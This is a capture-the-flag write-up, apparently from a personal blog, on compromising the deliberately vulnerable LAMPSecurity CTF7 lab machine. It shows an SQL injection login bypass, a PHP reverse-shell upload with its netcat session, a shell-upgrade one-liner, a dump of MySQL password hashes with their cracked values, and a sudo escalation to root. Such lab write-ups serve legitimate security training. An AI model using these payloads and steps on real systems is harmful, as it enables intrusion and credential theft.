---
layout: post
title:  "LAMPSecurity: CTF7"
date:   2020-12-31  +0400
categories: 
description: "This is the seventh CTF exercise of the LAMPSecurity project. It mainly focuses on enumerating webapps, and bypassing logins with SQL injection. Took some researching to find the right commands when finding the hashes in the SQL database, but it was a fun and interesting machine to pwn. Enjoy the writeup!"
---

<span style="text-decoration: underline">Box Stats:</span>

| Name: | LAMPSecurity: CTF7 |
|-------|--------|
| Series: | [LAMPSecurity](https://www.vulnhub.com/series/lampsecurity,43/) |
| Link: | https://www.vulnhub.com/entry/lampsecurity-ctf7,86/ |
| OS: | Linux - CentOS release 6.3 |
| Creator: | https://www.vulnhub.com/author/madirish2600,75/ |

## Topics: ##
- SQL Injection
- Web Application
- Enumeration
- Hash Cracking

## Recon #
Start your scans as you like to do them. I use my own tool that automates staged scanning using nmap. Here are the results:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 11:55 UTC
Nmap scan report for 192.168.12.141
Host is up (0.00024s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 41:8a:0d:5d:59:60:45:c4:c4:15:f3:8a:8d:c0:99:19 (DSA)
|_  2048 66:fb:a3:b4:74:72:66:f4:92:73:8f:bf:61:ec:8b:35 (RSA)
80/tcp    open  http        Apache httpd 2.2.15 ((CentOS))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.15 (CentOS)
|_http-title: Mad Irish Hacking Academy
139/tcp   open  netbios-ssn Samba smbd 3.5.10-125.el6 (workgroup: MYGROUP)
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required\x0D
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
8080/tcp  open  http        Apache httpd 2.2.15 ((CentOS))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.2.15 (CentOS)
| http-title: Admin :: Mad Irish Hacking Academy
|_Requested resource was /login.php
10000/tcp open  http        MiniServ 1.610 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin

	
|_clock-skew: mean: -14d14h49m02s, deviation: 3h32m07s, median: -14d17h19m02s
| smb-os-discovery: 
|   OS: Unix (Samba 3.5.10-125.el6)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: localhost
|_  System time: 2020-12-14T13:36:59-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.05 seconds
```


## Enumeration ##
```
22 - SSH - OpenSSH 5.3
80 - HTTP - Apache 2.2.15
139 - SMB - Samba smbd
901 - HTTP - unknown
8080 - HTTP - Apache 2.2.15
10000 - HTTP - MiniServ 1.610
```
It looks like this CTF will have loads of webapp enumeration and the exploits will be mostly involved around the HTTP protocols that are running. I'm sure 100% that SSH will not be exploited, rather it will be used to gain foothold into the machine (or using an uploaded shell).

# Port 80 - HTTP #
Here are the scans that I have conducted, I used to use gobuster, but I discovered `dirsearch` which is much quicker and the output is cleaner. Anyways, here are the results:
```
[11:18:37] 200 -    5KB - /about
[11:18:40] 301 -  315B  - /assets  ->  http://192.168.8.156/assets/
[11:18:40] 200 -    3KB - /assets/
[11:18:40] 301 -  331B  - /backups  ->  http://192.168.8.156/backups/?action=backups
[11:18:41] 403 -  289B  - /cgi-bin/
[11:18:42] 200 -    5KB - /contact
[11:18:42] 301 -  312B  - /css  ->  http://192.168.8.156/css/
[11:18:43] 200 -    6KB - /default
[11:18:43] 200 -    4KB - /db
[11:18:43] 403 -  287B  - /error/
[11:18:44] 200 -    4KB - /footer
[11:18:44] 200 -    4KB - /header
[11:18:44] 301 -  312B  - /inc  ->  http://192.168.8.156/inc/
[11:18:44] 200 -    4KB - /inc/
[11:18:44] 200 -    6KB - /index.php
[11:18:44] 200 -    6KB - /index.php/login/
[11:18:44] 301 -  312B  - /img  ->  http://192.168.8.156/img/
[11:18:45] 200 -    4KB - /js/
[11:18:46] 200 -    4KB - /newsletter
[11:18:47] 200 -   59KB - /phpinfo
[11:18:48] 200 -    4KB - /profile
[11:18:48] 200 -    6KB - /register
[11:18:49] 200 -    5KB - /signup
[11:18:50] 403 -  287B  - /usage/
[11:18:51] 301 -  318B  - /webalizer  ->  http://192.168.8.156/webalizer/
[11:18:52] 200 -    5KB - /webmail/
```

We can visit the webpage by simply typing the IP address into the browser's searchbar. We are brought to a page that is titled `Mad Irish Hacking Academy`, and the first thing that caught my attention is the login bar. I instantly registered with the credentials `test@test.com : test`.

![Home page](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/homepage.png?raw=true)


![Registering](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/registerandlogin.png?raw=true)

We can navigate to our proifile by clicking our name at the top-right of the page. We can see the query `id` in the URL `http://192.168.12.141/profile&id=115`! Hmmm, this is just like CTF4, I guessed. By adding a `'` at the end of the URL we trigger an SQL error:

![SQL error](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/sqlerror.png?raw=true)

Let's see if we can use `sqlmap` to get credentials from the backend databases. We can use the command `sqlmap -u "http://____________/profile&id=115" -p id  --tables --cookie=____` to list the tables. I tried this and it didn't work :( I guess this was either intended as a rabbit hole, or it was not intended to be exploited at all.

# Port 139 - SMB #
The SMB seemed to be down, so I skipped this as well. I noticed this was also happening for the previous CTFs, maybe this is an issue on my side, however I don't think SMB was the way to pwn this machine. 

```
$ smbclient -L \\\\192.168.12.141\\
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

# Port 901 - HTTP Login #
This website had no gui, as soon as you visited the url, a window popped up asking for credentials, I thought this will be used for maybe access to a later aspect of this challange so I continued to enumerate the rest of the ports. SQL injection used for bypassing logins would not work on this. Maybe when I got credentials I would try to login to this. The nmap scan didn't show me any versions, so I couldn't go and find potential vulnerabilities for it.


# Port 8080 - Login Page #
This webpage had a login page, nothing else. The first thing I test, is entering `'` into any of the fields. If this gives a login error, potentially it could disclose some information about the backend database. And as I expected, it gave me an error:

![Login Error](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/loginerror.png?raw=true)

Wow, this is really good. We are given the whole query and we can use it to craft our bypass. The error gave me the whole query of:
```
select * from users where username=''' AND password=md5('') and is_admin=1
```


## Exploitation ##

To bypass the login we found, we can use `' or 1=1 -- .` as this will be put into the query like so: `select * from users where username='' or 1=1 -- .' AND password=md5('') and is_admin=1`. This comments out the password section and makes us login with admin. We can head to `Manage Offerings > Reading Room > Add New` which allows us to post a a new reading and we could even add files:
![We can upload files!](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/uploadshell.png?raw=true)

We can use this feature to upload a php reverse shell, that executes on the machine's side, and connects back to us. We could use the metasploit payload, but I like to use the built-in version of it which can be accessed in kali at the `/usr/share/webshells/php/php-reverse-shell.php` directory. Our dirsearch scan also revealed the `/assets/` directory. This is where files are uploaded on the webserver. We can click on the uploaded reverse shell, and get a connection:
```
kali@maxtor:~/Writeups/CTF7$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.8.126] from (UNKNOWN) [192.168.8.156] 41049
Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux
 12:57:53 up 9 min,  0 users,  load average: 0.00, 0.06, 0.06
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-4.1$ whoami; id
whoami; id
apache
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

We can use Darkstar's guide to upgrading our shell:

1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better-featured 	bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
    
2. Step two is: `export TERM=xterm` – this will give us access to term commands such as clear.
    
3. Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

From here, I found a local privilige escalation exploit, however I was unable to get it working, if you used this exploit and it worked, than it's something on my side. Anyways, that wasn't the only way in. We knew there were users on the website from the website at port `8080`, by clicking on the `Users` tab:

![Users](https://github.com/ctrllevi/ctrllevi.github.io/blob/main/_posts/images/CTF7/users.png?raw=true)

We also knew that this information comes from the back-end database was MySQL. Using this information, we can guess that we are able to get the users' hashes using the mysql command-line interface. We can interact with it using the command `mysql -u root` without needing to supply a password on this machine. I used this vulnerability to get the hashes for every user on the machine:

```
bash-4.1$ mysql -u root   
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 40
Server version: 5.1.66 Source distribution

Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> USE website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
+-------------------+
| Tables_in_website |
+-------------------+
| contact           |
| documents         |
| hits              |
| log               |
| newsletter        |
| payment           |
| trainings         |
| trainings_x_users |
| users             |
+-------------------+
9 rows in set (0.00 sec)

mysql> select * from users;
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
| username                      | password                         | is_admin | last_login          | user_id | realname        | profile                                                                  |
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |        1 | 2012-12-19 11:30:54 |       3 | Brian Hershel   | Brian is our technical brains behind the operations and a chief trainer. |
| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |        1 | NULL                |       4 | John Durham     |                                                                          |
| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |        1 | NULL                |       5 | Alice Wonder    |                                                                          |
| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |        1 | NULL                |       6 | Ruby Spinster   |                                                                          |
| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |        1 | NULL                |       7 | Leon Parnetta   |                                                                          |
| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |        1 | NULL                |       8 | Julia Fields    |                                                                          |
| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |        0 | NULL                |       9 | Michael Saint   |                                                                          |
| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |        0 | NULL                |      10 | Bruce Pottricks |                                                                          |
| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |        0 | NULL                |      11 | Neil Felstein   |                                                                          |
| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |        0 | NULL                |      12 | Charles Adams   |                                                                          |
| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |        0 | NULL                |      36 |                 |                                                                          |
| test@test.com                 | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     115 |                 |                                                                          |
| test@test                     | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     114 | test            | test                                                                     |
| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     113 |                 |                                                                          |
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
14 rows in set (0.00 sec)
```

Here are the passwords that I got:
```
brian	e22f07b17f98e0d9d364584ced0e3c18	md5		my2cents
john	0d9ff2a4396d6939f80ffe09b1280ee1	md5		transformersrule
alice	2146bf95e8929874fc63d54f50f1d2e3	md5		turtles77
ruby	9f80ec37f8313728ef3e2f218c79aa23	Unknown	Not found.
leon	5d93ceb70e2bf5daa84ec3d0cd2c731a	md5		qwer1234
julia	ed2539fe892d2c52c42a440354e8e3d5	md5		madrid
michael	9c42a1346e333a770904b2a2b37fa7d3	md5		somepassword
bruce	3a24d81c2b9d0d9aaf2f10c6c9757d4e	md5		LosAngelesLakers
neil	4773408d5358875b3764db552a29ca61	Unknown	Not found.
charles	b2a97bcecbd9336b98d59d9324dae5cf	md5		chuck33
```
We can see from the database that the first six users have admin priviliges. This suggests that they could also have sudo priviliges on the system. There was also a description about brian, and he was the only one who ever logged on to the server, suggesting he must be a user with sudo priviliges. This was true for the following users as well: `john, alice, ruby, leon, julia`!. I used the user `brian` to switch users to `root` and pwn the machine:

```
[brian@localhost tmp]$ sudo -l

Matching Defaults entries for brian on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brian may run the following commands on this host:
    (ALL) ALL

[brian@localhost tmp]$ sudo su root
[root@localhost tmp]# whoami; id
root
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
```

Thank you for reading this writeup, and see you soon!
